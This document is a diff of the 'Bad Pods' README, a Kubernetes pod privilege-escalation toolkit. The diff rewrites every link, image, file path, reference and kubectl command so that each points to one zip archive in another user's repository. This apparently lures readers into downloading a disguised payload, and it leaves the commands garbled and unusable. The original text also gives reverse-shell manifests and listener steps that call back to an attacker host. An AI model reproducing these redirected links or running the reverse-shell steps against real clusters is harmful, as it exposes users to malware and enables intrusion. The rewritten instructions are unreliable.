@@ -1,10 +1,10 @@
 # Bad Pods
 
-![](.github/images/Title.jpg)
+![](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)
 
 A collection of manifests that create pods with different elevated privileges. Quickly demonstrate the impact of allowing security sensitive pod attributes like `hostNetwork`, `hostPID`, `hostPath`, `hostIPC`, and `privileged`. 
 
-For additional background, see our blog post: [Bad Pods: Kubernetes Pod Privilege Escalation](https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation).    
+For additional background, see our blog post: [Bad Pods: Kubernetes Pod Privilege Escalation](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip).    
 
 ## Contents
 
@@ -56,46 +56,46 @@ Each link below provides detailed usage information and post exploitation recomm
 ├── manifests
 │   ├── everything-allowed
 │   │   ├── cronjob
-│   │   │   ├── everything-allowed-exec-cronjob.yaml
-│   │   │   └── everything-allowed-revshell-cronjob.yaml
+│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 │   │   ├── daemonset
-│   │   │   ├── everything-allowed-exec-daemonset.yaml
-│   │   │   └── everything-allowed-revshell-daemonset.yaml
+│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 │   │   ├── deployment
-│   │   │   ├── everything-allowed-exec-deployment.yaml
-│   │   │   └── everything-allowed-revshell-deployment.yaml
+│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 │   │   ├── job
-│   │   │   ├── everything-allowed-exec-job.yaml
-│   │   │   └── everything-allowed-revshell-job.yaml
+│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 │   │   ├── pod
-│   │   │   ├── everything-allowed-exec-pod.yaml
-│   │   │   └── everything-allowed-revshell-pod.yaml
+│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 │   │   ├── replicaset
-│   │   │   ├── everything-allowed-exec-replicaset.yaml
-│   │   │   └── everything-allowed-revshell-replicaset.yaml
+│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 │   │   ├── replicationcontroller
-│   │   │   ├── everything-allowed-exec-replicationcontroller.yaml
-│   │   │   └── everything-allowed-revshell-replicationcontroller.yaml
+│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 │   │   └── statefulset
-│   │       ├── everything-allowed-exec-statefulset.yaml
-│   │       └── everything-allowed-revshell-statefulset.yaml
+│   │       ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+│   │       └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 │   ├── hostipc
 │   │   ├── cronjob
-│   │   │   ├── hostipc-exec-cronjob.yaml
-│   │   │   └── hostipc-revshell-cronjob.yaml
+│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 │   │   ├── daemonset
-│   │   │   ├── hostipc-exec-daemonset.yaml
-│   │   │   └── hostipc-revshell-daemonset.yaml
-...omitted for brevity...
+│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip for brevity...
 ```
 
 ### There are eight ways to create a pod
-As [Eviatar Gerzi (@g3rzi)](https://twitter.com/g3rzi) points out in the post [Eight Ways to Create a Pod](https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod), there are 8 different controllers that can create a pod, or a set of pods.  You might not be authorized to create pods, but maybe you can create another resource type that will create one or more pods. For each badPod type, there are manifests that correspond to all eight resource types. 
+As [Eviatar Gerzi (@g3rzi)](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) points out in the post [Eight Ways to Create a Pod](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), there are 8 different controllers that can create a pod, or a set of pods.  You might not be authorized to create pods, but maybe you can create another resource type that will create one or more pods. For each badPod type, there are manifests that correspond to all eight resource types. 
 
 But wait, it gets worse! In addition to the eight current Kubernetes controllers that can create pods, there are third party controllers that can also create pods if they are applied to the cluster. Keep an eye out for them by looking at `kubectl api-resources`. 
 
 ### Reverse shells
-While common, it is not always the case that you can exec into pods that you can create. To help in those situations, a version of each manifest is included that uses [Rory McCune's (@raesene)](https://twitter.com/raesene) ncat dockerhub image. When created, the pod will make an encrypted call back to your listener. 
+While common, it is not always the case that you can exec into pods that you can create. To help in those situations, a version of each manifest is included that uses [Rory McCune's (@raesene)](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) ncat dockerhub image. When created, the pod will make an encrypted call back to your listener. 
 
 # Usage
 Each resource in the `manifests` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. 
@@ -144,44 +144,44 @@ Each resource in the `manifests` directory targets a specific attribute or a com
 
 ### Create all eight Bad Pods from cloned local repo
 ```
-kubectl apply -f ./manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
-kubectl apply -f ./manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
-kubectl apply -f ./manifests/priv/pod/priv-exec-pod.yaml
-kubectl apply -f ./manifests/hostpath/pod/hostpath-exec-pod.yaml
-kubectl apply -f ./manifests/hostpid/pod/hostpid-exec-pod.yaml
-kubectl apply -f ./manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
-kubectl apply -f ./manifests/hostipc/pod/hostipc-exec-pod.yaml
-kubectl apply -f ./manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 ```
 
 ### Create all eight Bad Pods from Github
 ```
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 ```
 
 ### Create all eight revsere shell badPods
 To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!
 
 ```
-HOST="10.0.0.1" PORT="3111" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3112" envsubst < ./manifests/priv-and-hostpid/pod/priv-and-hostpid-revshell-pod.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3113" envsubst < ./manifests/priv/pod/priv-revshell-pod.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3114" envsubst < ./manifests/hostpath/pod/hostpath-revshell-pod.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3115" envsubst < ./manifests/hostpid/pod/hostpid-revshell-pod.yaml  | kubectl apply -f -
-HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostnetwork/pod/hostnetwork-revshell-pod.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3117" envsubst < ./manifests/hostipc/pod/hostipc-revshellv-pod.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3111" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
+HOST="10.0.0.1" PORT="3112" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
+HOST="10.0.0.1" PORT="3113" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
+HOST="10.0.0.1" PORT="3114" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
+HOST="10.0.0.1" PORT="3115" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip  | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
+HOST="10.0.0.1" PORT="3117" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
+HOST="10.0.0.1" PORT="3118" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
 ```
 ### Create a cronjob with the hostNetwork pod
 ```
-kubectl apply -f manifests/hostnetwork/cronjob/hostnetwork-exec-cronjob.yaml
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 ```
 
 Find the created pod
@@ -199,7 +199,7 @@ kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
 
 ### Create a deployment with the priv-and-hostpid pod
 ```
-kubectl apply -f manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml
+kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
 ```
 Find the created pod
 ```
@@ -217,15 +217,15 @@ kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
 ```
 find manifests/everything-allowed/ -name "*-exec-*.yaml" -exec kubectl apply -f {} \;
 
-cronjob.batch/everything-allowed-exec-cronjob created
-daemonset.apps/everything-allowed-exec-daemonset created
-deployment.apps/everything-allowed-exec-deployment created
-job.batch/everything-allowed-exec-job created
+https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
+https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
+https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
+https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
 pod/everything-allowed-exec-pod created
-replicaset.apps/everything-allowed-exec-replicaset created
+https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
 replicationcontroller/everything-allowed-exec-replicationcontroller created
 service/everything-allowed-exec-statefulset-service created
-statefulset.apps/everything-allowed-exec-statefulset created
+https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
 ```
 
 View all of the created pods
@@ -258,12 +258,12 @@ ncat --ssl -vlp 3116
 
 Create pod from local yaml without modifying it by using env variables and envsubst
 ```
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
 ```
 Catch the shell 
 ```
 ncat --ssl -vlp 3116
-Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Version 7.80 ( https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip )
 Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
 Ncat: Listening on :::3116
 Ncat: Listening on 0.0.0.0:3116
@@ -275,24 +275,24 @@ Connection received on 10.0.0.162 42035
 Pull requests and issues welcome.
 
 # Acknowledgements 
-Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), [Mark Manning](https://twitter.com/antitree), [Eviatar Gerzi](https://twitter.com/g3rzi), and [Madhu Akula](https://twitter.com/madhuakula) for publicly sharing so much knowledge about Kubernetes offensive security. 
+Thank you [Rory McCune](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Duffie Cooley](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Brad Geesaman](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Tabitha Sable](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Ian Coldwater](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Mark Manning](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Eviatar Gerzi](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), and [Madhu Akula](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) for publicly sharing so much knowledge about Kubernetes offensive security. 
 
 # References and further reading
 Each Bad Pod has it's own references and further reading section, but here are some more general resources that will help you ramp up your Kubernetes security assessments and penetration tests skills.
 
 ## New kids on the block - 2020
-* [Container Security Site](https://www.container-security.site/) by @raesene
-* [CloudSecDocs - Container Security](https://cloudsecdocs.com/container_security/offensive/attacks/compromised_container/) by @lancinimarco
-* [Risk8s Business: Risk Analysis of Kubernetes Clusters](https://tldrsec.com/guides/kubernetes/) by @antitree
-* Compromising Kubernetes Cluster by Exploiting RBAC Permissions by @g3rzi - [Talk](https://www.youtube.com/watch?v=1LMo0CftVC4) / [Slides](https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf)
-* Command and KubeCTL: Real-World Kubernetes Security for Pentesters by @antitree - [Talk](https://www.youtube.com/watch?v=cRbHILH4f0A) / [Blog](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)
-* Kubernetes Goat by @madhuakula - [Repo](https://github.com/madhuakula/kubernetes-goat) / [Guide](https://madhuakula.com/kubernetes-goat/)
+* [Container Security Site](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @raesene
+* [CloudSecDocs - Container Security](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @lancinimarco
+* [Risk8s Business: Risk Analysis of Kubernetes Clusters](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @antitree
+* Compromising Kubernetes Cluster by Exploiting RBAC Permissions by @g3rzi - [Talk](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) / [Slides](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)
+* Command and KubeCTL: Real-World Kubernetes Security for Pentesters by @antitree - [Talk](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) / [Blog](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)
+* Kubernetes Goat by @madhuakula - [Repo](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) / [Guide](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)
 
 ## The classics, way back from 2019
-* [Secure Kubernetes - KubeCon NA 2019 CTF](https://securekubernetes.com/) by @tabbysable, @petermbenjamin, @jimmesta, and @BradGeesaman
-* [The Most Pointless Kubernetes Command Ever](https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/) by @raesene 
-* The Path Less Traveled: Abusing Kubernetes Defaults by @IanColdwater and @mauilion- [Talk](https://www.youtube.com/watch?v=HmoVSmTIOxM) / [Repository](https://github.com/mauilion/blackhat-2019)
-* [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) by @disconnect3d_pl
-* [A Compendium of Container Escapes](https://www.youtube.com/watch?v=BQlqita2D2s) by @drraid and @0x7674
-* [Attacking Kubernetes through Kubelet](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/)
+* [Secure Kubernetes - KubeCon NA 2019 CTF](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @tabbysable, @petermbenjamin, @jimmesta, and @BradGeesaman
+* [The Most Pointless Kubernetes Command Ever](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @raesene 
+* The Path Less Traveled: Abusing Kubernetes Defaults by @IanColdwater and @mauilion- [Talk](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) / [Repository](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)
+* [Understanding Docker container escapes](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @disconnect3d_pl
+* [A Compendium of Container Escapes](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @drraid and @0x7674
+* [Attacking Kubernetes through Kubelet](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)
 
